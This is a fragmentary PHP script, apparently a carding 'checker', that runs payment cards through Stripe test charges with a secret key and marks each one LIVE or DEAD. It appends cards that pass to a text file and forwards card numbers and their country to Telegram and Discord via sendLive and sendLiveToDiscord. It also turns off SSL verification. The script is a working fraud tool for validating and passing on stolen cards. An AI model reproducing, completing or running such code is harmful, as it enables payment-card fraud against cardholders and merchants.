...
$type = trim(strip_tags(g($curl4, '"type":"','"')));
...
if(!$token){
  if(isset($dcode_src)){
    echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">'.$code_src.' ~ '.$dcode_src.'</span> <span class="badge bg-light text-dark">Hyper x Seora</span>';
    exit;
  } else {
    echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">ID "src_" not found. '.$code_src.' '.$message_src.'</span> <span class="badge bg-light text-dark">Hyper x Seora</span>';
    exit;
  }
}
...
if(!$cus){
  if(isset($dcode_cus)){
    echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">'.$code_cus.' ~ '.$dcode_cus.'</span> <span class="badge bg-light text-dark">Hyper x Seora</span>';
    exit;
  } else {
    echo '<span class="badge bg-danger">#DEAD</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">ID "cus_" not found. ('.$code_cus.' '.$message_cus.')</span> <span class="badge bg-light text-dark">Hyper x Seora</span>';
    exit;
  }
}
...
$headers = array();
$headers[] = 'Authorization: Bearer '.$sklive.'';
$postfield = 'amount=5000&currency=inr&customer=cus_'.$cus.'';
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
$curl3 = curl_exec($ch);
...
echo "$curl<br><br>$curl2<br><br>$curl3<br><br>";
##################################
if (substr_count($curl3, '"status": "succeeded"') > 0){ 
  fwrite(fopen("individual2.txt", "a"), $card ."\r\n");
    $msg_1 = urlencode("<code>$card</code> ~ CVV Matched ($5) ~ <b>Country:</b> $country");
    sendLive($chatId, $msg_1);  
    sendLiveToDiscord("`$card` ~ CVV Matched ($5) ~ **Country:** $country");
  ...
  if($dcode_3 == "generic_decline"){
    ...
    $msg_2 = urlencode("<code>$card</code> ~ CVV Matched ($dcode_3 ~ $code3 | $dcode_1 ~ $code_1) ~ <b>Country:</b> $country");
    sendLive($chatId, $msg_2);  
    sendLiveToDiscord("`$card` ~ CVV Matched ($dcode_3 ~ $code3 | $dcode_1 ~ $code_1) ~ **Country:** $country");
    echo '<span class="badge bg-success">#LIVE</span> <span class="badge bg-light text-dark">'.$card.'</span> <span class="badge bg-dark">CVV Matched => ('.$dcode_3.') '.$code3.'</span> <span class="badge bg-light text-dark">'.$binDetails.'</span> <span class="badge bg-dark">Bonten</span>';
    exit;  
  }
